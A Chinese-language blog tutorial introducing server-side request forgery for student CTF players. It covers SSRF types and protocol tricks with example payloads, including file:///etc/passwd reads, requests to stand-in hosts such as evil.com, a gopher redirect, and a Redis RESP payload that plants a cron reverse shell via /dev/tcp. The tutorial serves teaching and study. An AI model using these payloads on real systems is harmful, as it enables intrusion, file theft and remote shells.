<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"apsry.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="SSRF入门">
<meta property="og:type" content="article">
<meta property="og:title" content="SSRF入门">
<meta property="og:url" content="https://apsry.github.io/2022/09/12/ssrf/index.html">
<meta property="og:site_name" content="apsry">
<meta property="og:description" content="SSRF入门">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661695222075-fc8f794b-e0d8-460f-8964-22be70fc018d.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661696682509-dc4d40cc-975c-43e1-bbac-0102c2ec0e13.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661696779668-4c702eb6-a0af-4943-af9d-e55c5d15fa94.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661696873694-907d140d-a7de-4b73-90db-32545808a7c9.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661697347466-5789072f-ba10-4704-82e6-a5e48049a710.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661698056849-c81b5cb5-3dd0-428c-91a8-d58bc71cbb68.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661699079830-bd064062-e718-4717-ac5e-ce8f93468a9a.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661700571309-3c0b6b55-aae2-4b25-9248-7ba3a4f096ee.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661700600703-8c0883f6-908e-4677-95e2-71b5a5aae2ca.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661702103679-a065ab17-84bb-40ea-8a50-09f200ad3e9e.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661702103739-dbe29b0b-791c-4815-b4cf-46325e0ed72e.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661789085951-54500db3-8220-4994-9b60-814b5edd7921.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661789179334-13499eec-673c-4180-9acc-b4b66fc36f82.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661789504136-d88b5dea-c5cb-40e6-8c5b-750e50a0a5d8.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661789549728-2c1b01f2-e9b9-4005-8d01-0297b290beb7.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661790447439-c1d1c170-9cb1-4651-b736-5b55d6c4aadd.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661790541956-736b929d-cabb-4a0e-b46d-9598650f967f.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661790589843-03acda19-4ae2-4e74-bc40-42484856c67f.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661953264374-72bdf99d-49e8-4a9d-8526-271c11ca89a1.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661953368870-bde7653c-ab22-4d60-b068-2fbc2ffcbe87.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661953616224-6b01eba8-4877-41eb-9bf6-a814ccaac441.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661953869174-f94553d7-bde2-4866-aa8f-b7b8a43ce0ae.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661955087683-f80ba94e-def9-45ba-8c80-ec546c7d1e0e.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661955423480-18646179-7d1c-41f8-b7c7-e670b0fd3519.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661955434016-bb8b1488-b667-47cc-aa7c-6a0bab952d9d.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661955637890-6dc21e09-4575-4020-8f29-2ec17da57ad5.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662905433267-9bbbc072-6b5a-4ce9-b47a-99d8fcdfa5bb.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662905905704-7222cc38-0476-4eda-87d1-13574a08f621.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662909070324-ad7bda2a-b1d3-4fad-bcf1-936cd6d12a4b.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662964713098-500ed322-387a-4ff4-baa2-ca161db9e6a6.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661957643468-3cd96177-fe5e-4a37-91a3-bed18b399dec.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662472592553-e7cffa4b-cae3-4621-bd23-b2e070f91d40.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662473204352-edf1ac97-6e53-452e-a402-bc77883e409a.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662473343708-a08796a3-4b36-4913-9816-3059f24b7c84.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662473488475-42395ba8-3fdf-4b6f-81b0-eba1f50d70ea.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662473596421-4220e1e8-1243-45bc-b85a-a54ee0e58cd9.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662473705848-8684e19e-a3d8-40f4-870c-bbd40854e06c.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662473984198-3112558c-d6a3-46cf-925f-a4d299208ac7.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662474056772-7a8e871f-37dc-4681-ae7e-83d207d605b2.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662474061130-026ce8bd-1a60-4579-a19d-cf6de5185e73.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662474540746-5e507fd5-fd5f-422a-90a4-e497b97af16c.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662475439503-14d10b44-dd1b-4945-bcf1-64e2a4efb23e.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662642295605-83015f2b-702b-43c3-a82d-de4baaa629e2.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662642295699-51bc09cd-26b8-413f-a801-8b458893d619.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662477573859-941ac1ba-2ee9-4bc5-ac54-44df05f9294f.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662643466000-51438320-22cb-4b06-88c6-699925bda773.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661786323586-aafcc1a4-819d-4c97-b29e-8c8beaf3d690.png">
<meta property="article:published_time" content="2022-09-12T07:26:00.000Z">
<meta property="article:modified_time" content="2022-09-12T07:16:04.109Z">
<meta property="article:author" content="apsry">
<meta property="article:tag" content="web安全">
<meta property="article:tag" content="SSRF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661695222075-fc8f794b-e0d8-460f-8964-22be70fc018d.png">

<link rel="canonical" href="https://apsry.github.io/2022/09/12/ssrf/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>SSRF入门 | apsry</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="apsry" type="application/atom+xml">
</head>
<!-- 引入目录截取js -->
<script type="text/javascript" src="/js/src/abstract.js"></script>


<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">apsry</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">去留无意，宠辱不惊</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://apsry.github.io/2022/09/12/ssrf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="apsry">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="apsry">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          SSRF入门
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-09-12 15:26:00 / 修改时间：15:16:04" itemprop="dateCreated datePublished" datetime="2022-09-12T15:26:00+08:00">2022-09-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>SSRF入门</p>
<span id="more"></span>



<p>写在前面：<br>这几天感觉自己的基础还是不够牢固，所以打算开个大坑，把web安全基础再复习下(希望能坚持下去，最近开的坑有点多，要学的太多了，越来越感觉自己菜了)，顺便写点笔记留个学弟学妹，大一大二的时候挺担心自己退役学校CTF就直接消亡了，毕竟一手带我的学长们都是尽力的带我这个小白，现在到了自己变成学长了，感触还是挺多的，虽然大四了，也没有阻止没落这一趋势，但还是打算留点东西，给愿意学的学弟学妹。<br>吐槽下：<br>前几天和毕业的学长聊了下，发现一个尴尬的问题，愿意学的学生，不需要你教也会去学，不愿意学的好像我准备再多再详细的课程也没有用，希望走网络安全还是因为热爱，不忘初心吧，再说点别的就是把基础搞好点，在我看来，漏洞挖掘渗透内网虽然是经验一说，但经验这种东西，如果有一个人带你，你会很快拥有他，这个时候基础会决定你的上限。<br>写的有点乱，基本都是抄的，多总结，多复现就变成自己的了，能抄的补充的，为什么还要自己写呢0.0</p>
<h2 id="SSRF简介"><a href="#SSRF简介" class="headerlink" title="SSRF简介"></a>SSRF简介</h2><p>SSRF，Server-Side Request Forgery，<strong>服务端请求伪造</strong>，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是<strong>从外网无法访问的内部系统</strong>。<br><strong>漏洞成因</strong><br>漏洞形成的原因<strong>大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制</strong>。<br><strong>一点看法</strong><br>ssrf也即伪造服务端对访问外部无法访问的系统，ssrf能打的东西比较多，只要能访问内网，协议支持，理论上把内网打穿也是可以的，所以近几年ssrf成了一个热点。</p>
<h2 id="SSRF类型"><a href="#SSRF类型" class="headerlink" title="SSRF类型"></a>SSRF类型</h2><p>1、Basic SSRF：返回结果到客户端，如传送一个网址，会返回这个网址的界面或对应的 html 代码，总之就是返回了结果<br>2、Blind SSRF：和上面正好相反，不会返回结果到客户端，简单分个类吧，和sql注入盲注类似。</p>
<ul>
<li>_Boolean-Based：_无论资源是否存在，服务器的回应都是不同的</li>
<li>_Error-Based：_例如HTTP（404或500），指示资源是否存在</li>
<li>_Time-Based：_如果无论资源是否存在，服务器的响应都保持不变，响应时间可能会有很大差异。<h2 id="SSRF利用方式"><a href="#SSRF利用方式" class="headerlink" title="SSRF利用方式"></a>SSRF利用方式</h2>攻击者可以利用 SSRF 实现的攻击主要有 6 种：</li>
</ul>
<ol>
<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li>
<li>攻击运行在内网或本地的应用程序（比如溢出）</li>
<li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</li>
<li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</li>
<li>利用 file 等协议读取本地文件等</li>
<li>跳板攻击打内网，和前面意思差不多，不过拎出来下</li>
</ol>
<h2 id="SSRF协议介绍"><a href="#SSRF协议介绍" class="headerlink" title="SSRF协议介绍"></a>SSRF协议介绍</h2><p>一般来说可以通过ssrf利用一些协议对内网进行一些操作，首先要明确的一个点，<strong>对于不同语言实现的web系统可以使用的协议也存在不同的差异</strong>，而且相同语言，相同函数的不同版本，可利用的协议也是有区别的，这个得自己去探究。<br><strong>这里介绍常用的几种协议</strong><br>这里给出<strong>java，php的支持协议区别</strong>,可以看到基本上java是不支持gopher的，低版本我记得是支持的，总之java ssrf的扩展面相对会小一些</p>
<h3 id="java，php的支持的协议"><a href="#java，php的支持的协议" class="headerlink" title="java，php的支持的协议"></a>java，php的支持的协议</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:</span><br><span class="line"><span class="keyword">http</span>、<span class="keyword">https</span>、<span class="built_in">file</span>、gopher、phar、dict、<span class="keyword">ftp</span>、ssh、telnet...</span><br><span class="line">java:</span><br><span class="line"><span class="keyword">http</span>、<span class="keyword">https</span>、<span class="built_in">file</span>、<span class="keyword">ftp</span>、jar、netdoc、mailto...</span><br></pre></td></tr></table></figure>
<h3 id="http-x2F-x2F"><a href="#http-x2F-x2F" class="headerlink" title="http:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;</h3><p>不多说，基本都会</p>
<h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>这种URL Schema可以尝试从文件系统中获取文件：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>example.com/ssrf.php?url=file:<span class="regexp">//</span><span class="regexp">/etc/pass</span>wd</span><br><span class="line">http:<span class="regexp">//</span>example.com/ssrf.php?url=file:<span class="regexp">//</span><span class="regexp">/C:/</span>Windows/win.ini</span><br></pre></td></tr></table></figure>

<p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL 协议就可以绕过这些限制<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661695222075-fc8f794b-e0d8-460f-8964-22be70fc018d.png" alt="image.png"><br>可以理解下他们的区别，其实很多知识还是看有了经验以后看书理解的更快<br><strong>file协议与http协议的区别</strong></p>
<p>（1）file协议主要用于读取服务器本地文件，访问的是本地的静态资源<br>（2）http是访问本地的html文件，简单来说file只能静态读取，http可以动态解析<br>（3）http服务器可以开放端口，让他人通过http访问服务器资源，但file不可以<br>（4）file对应的类似http的协议是ftp协议（文件传输协议）<br>（5）file不能跨域</p>
<h3 id="dict-x2F-x2F"><a href="#dict-x2F-x2F" class="headerlink" title="dict:&#x2F;&#x2F;"></a>dict:&#x2F;&#x2F;</h3><p>dict 协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源，<br>能用来探测端口的指纹信息协议格式：dict:&#x2F;&#x2F;<host>:<port>&#x2F;<dict-path><br>一般用dict:&#x2F;&#x2F;<host>:<port>&#x2F;info 探测端口应用信息<br>例如</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>example.com<span class="regexp">/ssrf.php?dict:/</span><span class="regexp">/evil.com:1337/</span> </span><br><span class="line">evil.com:$ nc -lvp <span class="number">1337</span></span><br><span class="line">Connection from [<span class="number">192.168</span>.<span class="number">0.12</span>] port <span class="number">1337</span>[tcp/*] </span><br><span class="line">accepted (family <span class="number">2</span>, sport <span class="number">31126</span>)CLIENT libcurl <span class="number">7.40</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line">dict:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6379</span> <span class="regexp">//</span>探测redis是否存活</span><br><span class="line">dict:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6379</span><span class="regexp">/info /</span><span class="regexp">/探测端口应用信息</span></span><br></pre></td></tr></table></figure>
<h3 id="sftp-x2F-x2F"><a href="#sftp-x2F-x2F" class="headerlink" title="sftp:&#x2F;&#x2F;"></a>sftp:&#x2F;&#x2F;</h3><p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/example.com/ssrf</span>.php?url=<span class="symbol">sftp:</span>/<span class="regexp">/evil.com:1337/</span> </span><br><span class="line">evil.<span class="symbol">com:</span><span class="variable">$ </span>nc -lvp <span class="number">1337</span></span><br><span class="line">Connection from [<span class="number">192.168</span>.<span class="number">0.12</span>] port <span class="number">1337</span>[tcp/*] </span><br><span class="line">accepted (family <span class="number">2</span>, sport <span class="number">37146</span>)SSH-<span class="number">2.0</span>-libssh2_1.<span class="number">4.2</span></span><br></pre></td></tr></table></figure>
<h3 id="ldap-x2F-x2F-或ldaps-x2F-x2F-或ldapi-x2F-x2F"><a href="#ldap-x2F-x2F-或ldaps-x2F-x2F-或ldapi-x2F-x2F" class="headerlink" title="ldap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或ldapi:&#x2F;&#x2F;"></a>ldap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或ldapi:&#x2F;&#x2F;</h3><p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>example.com/ssrf.php?url=ldap:<span class="regexp">//l</span>ocalhost:<span class="number">1337</span>/%0astats%0aquit</span><br><span class="line">http:<span class="regexp">//</span>example.com/ssrf.php?url=ldaps:<span class="regexp">//l</span>ocalhost:<span class="number">1337</span>/%0astats%0aquit</span><br><span class="line">http:<span class="regexp">//</span>example.com/ssrf.php?url=ldapi:<span class="regexp">//l</span>ocalhost:<span class="number">1337</span>/%0astats%0aquit</span><br></pre></td></tr></table></figure>
<h3 id="tftp-x2F-x2F"><a href="#tftp-x2F-x2F" class="headerlink" title="tftp:&#x2F;&#x2F;"></a>tftp:&#x2F;&#x2F;</h3><p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET </span><br><span class="line">evil.com:<span class="comment"># nc -lvup 1337</span></span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure>
<h3 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h3><p>RESP 协议是 redis 服务之间数据传输的通信协议，redis 客户端和 redis 服务端之间通信会采取 RESP 协议<br>因此我们后续构造 payload 时也需要转换成 RESP 协议的格式</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">*1</span></span><br><span class="line"><span class="variable">$8</span></span><br><span class="line">flushall</span><br><span class="line"><span class="number">*3</span></span><br><span class="line"><span class="variable">$3</span></span><br><span class="line"><span class="built_in">set</span></span><br><span class="line"><span class="variable">$1</span></span><br><span class="line">1</span><br><span class="line"><span class="variable">$64</span></span><br><span class="line"></span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.230.132/1234 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="number">*4</span></span><br><span class="line"><span class="variable">$6</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">config</span></span><br><span class="line"><span class="built_in"></span><span class="variable">$3</span></span><br><span class="line"><span class="built_in">set</span></span><br><span class="line"><span class="variable">$3</span></span><br><span class="line">dir</span><br><span class="line"><span class="variable">$16</span></span><br><span class="line">/var/spool/cron/</span><br><span class="line"><span class="number">*4</span></span><br><span class="line"><span class="variable">$6</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">config</span></span><br><span class="line"><span class="built_in"></span><span class="variable">$3</span></span><br><span class="line"><span class="built_in">set</span></span><br><span class="line"><span class="variable">$10</span></span><br><span class="line">dbfilename</span><br><span class="line"><span class="variable">$4</span></span><br><span class="line">root</span><br><span class="line"><span class="number">*1</span></span><br><span class="line"><span class="variable">$4</span></span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
<p>其中</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="built_in">n</span>代表着一条命令的开始，<span class="built_in">n</span> 表示该条命令由 <span class="built_in">n</span> 个字符串组成</span><br><span class="line">$<span class="built_in">n</span>代表着该字符串有 <span class="built_in">n</span> 个字符</span><br></pre></td></tr></table></figure>
<p>执行成功后服务器会返回 +OK，这个是 redis 服务器对 redis 客户端的响应</p>
<h3 id="gopher-x2F-x2F"><a href="#gopher-x2F-x2F" class="headerlink" title="gopher:&#x2F;&#x2F;"></a>gopher:&#x2F;&#x2F;</h3><p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。<br>Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//example.com/ssrf.php?url=http://attacker.com/gopher.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>  <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">Copyevil.com:<span class="comment"># nc -lvp 1337</span></span><br><span class="line">Listening on [<span class="number">0.0</span>.<span class="number">0.0</span>] (family <span class="number">0</span>, port1337)Connection <span class="keyword">from</span> [<span class="number">192.168</span>.<span class="number">0.12</span>] port <span class="number">1337</span>[tcp<span class="comment">/*] accepted (family 2, sport 49398)Hissrftest</span></span><br></pre></td></tr></table></figure>
<p>可以看看这篇文章，写的挺好的<br><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">利用 Gopher 协议拓展攻击面</a></p>
<h4 id="系统局限性"><a href="#系统局限性" class="headerlink" title="系统局限性"></a>系统局限性</h4><p>经过测试发现 Gopher 的以下几点局限性：</p>
<ul>
<li>大部分 PHP 并不会开启 fopen 的 gopher wrapper</li>
<li>file_get_contents 的 gopher 协议不能 URLencode</li>
<li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li>
<li>PHP 的 curl 默认不 follow 302 跳转</li>
<li>curl&#x2F;libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</li>
</ul>
<p>更多有待补充。<br>另外，并不限于 PHP 的 SSRF。当存在 XXE、ffmepg SSRF 等漏洞的时候，也可以进行利用。</p>
<h4 id="更多攻击面"><a href="#更多攻击面" class="headerlink" title="更多攻击面"></a>更多攻击面</h4><p><strong>基于 TCP Stream 且不做交互的点都可以进行攻击利用</strong>，包括但不限于：</p>
<ul>
<li>HTTP GET&#x2F;POST</li>
<li>Redis</li>
<li>Memcache</li>
<li>SMTP</li>
<li>Telnet</li>
<li>基于一个 TCP 包的 exploit</li>
<li>FTP（不能实现上传下载文件，但是在有回显的情况下可用于爆破内网 FTP）</li>
</ul>
<p>更多有待补充。</p>
